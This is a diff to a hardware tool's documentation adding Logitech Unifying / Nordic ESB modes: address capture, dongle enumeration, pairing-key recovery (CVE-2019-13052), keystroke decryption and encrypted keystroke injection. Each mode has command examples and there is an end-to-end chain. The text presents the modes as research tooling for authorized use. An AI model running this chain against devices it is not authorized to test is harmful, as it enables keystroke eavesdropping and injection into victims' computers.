@@ -784,6 +784,130 @@ found and fixed in `mode_spectrum.c`; as of this writing that fix is built but n
 confirmed clean on real hardware -- if `get-result` ever again returns what looks like a
 duplicate record, that's the first thing to re-check.
 
+## ESB / Logitech Unifying  *(Lite + Ultra, experimental)*
+
+A family of modes for Nordic ESB / nRF24-framed 2.4 GHz traffic, aimed at
+Logitech Unifying mice and keyboards. The crypto, frame formats, promiscuous
+validation and the active-enumeration method are ported from Marcus Mengs'
+(mame82) **LOGITacker**; the pairing-key recovery is CVE-2019-13052. This is
+research tooling for your own devices and authorized engagements.
+
+Four modes plus host-side analysis form a chain: **capture** an address →
+**enumerate** the dongle's devices → recover a **key** from a pairing →
+**decrypt** keystrokes or **inject** your own.
+
+Each mode is its own build flag, off by default:
+`STANDALONE_ESB`, `STANDALONE_ESB_PROMISC`, `STANDALONE_ESB_INJECT`,
+`STANDALONE_ESB_ENUM`.
+
+### `esb` ,  passive receive on a known address  *(needs `STANDALONE_ESB=1`)*
+
+Address-matched RX in SoftDevice timeslots. Use it once you know a device's
+5-byte address (base-first, as a capture shows it). Captures are host-validated and classified.
+
+```
+standalone config esb --address AABBCCDDEE --channel 5 --bitrate 2m
+standalone config esb --address AABBCCDDEE --dwell 500          # hop, 500 ms/channel
+standalone set-mode esb ; standalone trigger
+standalone esb get-result                 # CRC-checked, Unifying-classified frames
+```
+
+### `esb-promisc` ,  preamble-sync capture, unknown address  *(needs `STANDALONE_ESB_PROMISC=1`)*
+
+Matches on the ESB preamble, so every on-air frame syncs. CRC is off on-chip,
+so the host CRC-checks each capture to pick out real frames. Use it to find a
+device with no prior knowledge.
+
+```
+standalone config esb-promisc --channel 5                 # one fixed channel
+standalone config esb-promisc --hop on --strict on        # sweep Unifying set, Unifying-only
+standalone set-mode esb-promisc ; standalone trigger
+standalone esb-promisc get-result                         # candidate frames + summary
+```
+
+- `--hop on` sweeps the Unifying channel set `{5,8,..,77}` (~100 ms/channel). A
+  device hops, so a fixed channel catches it ~4 % of the time.
+- `--strict on` logs only Unifying-shaped frames (len 0/5/10/22) whose vendor
+  checksum is valid, mirroring LOGITacker's `LOGITECH_FILTER`. Length-0
+  keepalives pass on CRC alone (the clearest live-device signal); trust an
+  address that **repeats**, not an isolated hit.
+
+Capture length is 32 bytes, enough for a full 22-byte Unifying frame
+(encrypted-keyboard and pairing frames); shorter truncates them below their CRC.
+
+### `esb-enum` ,  active enumeration of a dongle  *(needs `STANDALONE_ESB_ENUM=1`)*
+
+The practical shortcut: catch **one** frame (even a mouse move or keepalive),
+take its 4-byte base, and actively interrogate the dongle. It pings every
+prefix and uses the ESB ACK as the detector -- a prefix the dongle listens on
+ACKs, revealing a paired device address, without the input device transmitting.
+This is LOGITacker's `active_enum`.
+
+```
+standalone esb-enum --base E2C7A1B9                 # base = first 4 of a captured address
+standalone esb-enum --base E2C7A1B9 --bitrate 2m --prefix-lo 0 --prefix-hi 255
+standalone get-status                               # pings / acks / tx_timeout while sweeping
+```
+
+Output is the device list (`base+prefix`); prefix `0x00` is the dongle itself.
+Feed an address straight into `esb-inject` or capture its pairing. This mode
+transmits -- it is active, not passive.
+
+### `esb-inject` ,  Unifying keystroke injection  *(needs `STANDALONE_ESB_INJECT=1`)*
+
+Builds the encrypted keyboard frames host-side (verified) for a string and
+transmits them on a target address, swept across the Unifying channel set. Needs
+the device key (below) and the target's 5-byte address.
+
+```
+standalone esb-inject --addr E2C7A1B93F --key 0244AA..4044 --text "hi"
+standalone esb-inject --addr E2C7A1B93F --key 0244AA..4044 --text "blåbærgrød" --layout dk
+standalone esb-inject --addr E2C7A1B93F --key 0244AA..4044 --text "x" --counter 0x5a0 --repeat 2
+```
+
+- `--layout us|dk` selects the HID keymap; AltGr-only glyphs (`@ { [ }`) are not
+  mapped and are reported as skipped.
+- `--counter` should be at or ahead of the receiver's last-seen value (from a
+  captured encrypted-keyboard frame); the firmware transmits verbatim.
+
+### Host-side analysis (no mode needed to parse)
+
+Recover the key from a captured pairing, decrypt captured keystrokes, or build
+frames offline. These run on the host against captured data.
+
+```
+# derive the AES link key from a captured pairing (power-cycle the device to re-pair):
+standalone esb-promisc get-result --pairing
+
+# decrypt captured encrypted-keyboard frames to text:
+standalone esb-promisc get-result --key 0244AA..4044 --layout dk
+
+# offline: analyse a saved capture, no device attached:
+standalone esb-promisc get-result --raw -f cap.bin
+data esb-analyze cap.bin --pairing
+data esb-analyze cap.bin --key 0244AA..4044 --layout dk
+data esb-analyze frames.hex --hex --key 0244AA..4044     # payload hex, one per line
+
+# build inject frames offline (staging / firmware-TX test vectors):
+data esb-build --key 0244AA..4044 --text "hej" --layout dk --counter 0x20
+```
+
+### End-to-end
+
+```
+standalone config esb-promisc --hop on --strict on
+standalone set-mode esb-promisc ; standalone trigger
+standalone esb-promisc get-result                 # 1. catch any frame -> an address
+standalone esb-enum --base <first 8 hex>           # 2. -> the dongle's device list
+standalone esb-promisc get-result --pairing        # 3. -> device key (force a re-pair)
+standalone esb-inject --addr <10 hex> --key <32 hex> --text "test"   # 4.
+```
+
+Captures from `esb-promisc` are **candidates, not confirmed frames** until an
+address repeats or a checksum verifies -- an isolated CRC hit on a quiet channel
+is usually noise. The TX modes (`esb-enum`, `esb-inject`) are under hardware
+bring-up; watch `acks` / `tx_done` in `standalone get-status`.
+
 ## `--opt-in` and quiet flags
 
 `set-mode` takes optional flags:
@@ -800,7 +924,7 @@ duplicate record, that's the first thing to re-check.
 | `ls` | List available modes. |
 | `status` | Current mode, armed state, stored-result count. |
 | `set-mode <name> [--opt-in] [--quiet-buzzer] [--quiet-led]` | Select the active mode. |
-| `config <name> [--block --key-type --key --timeout --min-level --cooldown --ble --read-blocks --also-slot --sectors \| -d <hex>]` | Write the mode's config. `authtrace` uses `--block/--key-type/--key/--timeout`; `hf14a-tap-sniff` uses `--timeout`; `relay` reuses `--timeout` as WTX; `nfc-canary` uses `--min-level/--cooldown/--ble`; `read-replay` uses `--read-blocks`; `autoclone` uses `--also-slot`; `dict-check` uses `--sectors`; `slot-cycle` uses raw `-d <hex>`. |
+| `config <name> [--block --key-type --key --timeout --min-level --cooldown --ble --read-blocks --also-slot --sectors \| -d <hex>]` | Write the mode's config. `authtrace` uses `--block/--key-type/--key/--timeout`; `hf14a-tap-sniff` uses `--timeout`; `relay` reuses `--timeout` as WTX; `nfc-canary` uses `--min-level/--cooldown/--ble`; `read-replay` uses `--read-blocks`; `autoclone` uses `--also-slot`; `dict-check` uses `--sectors`; `slot-cycle` uses raw `-d <hex>`; `esb` uses `--address/--channel/--dwell/--bitrate`; `esb-promisc` uses `--channel/--prefix-lo/--prefix-hi/--hop/--strict` (`esb-enum` and `esb-inject` take their arguments on the command itself, not via `config`). |
 | `trigger` | Arm the active mode from the host. |
 | `disarm` | Disarm and save results. |
 | `get-result` | Retrieve stored session results. |
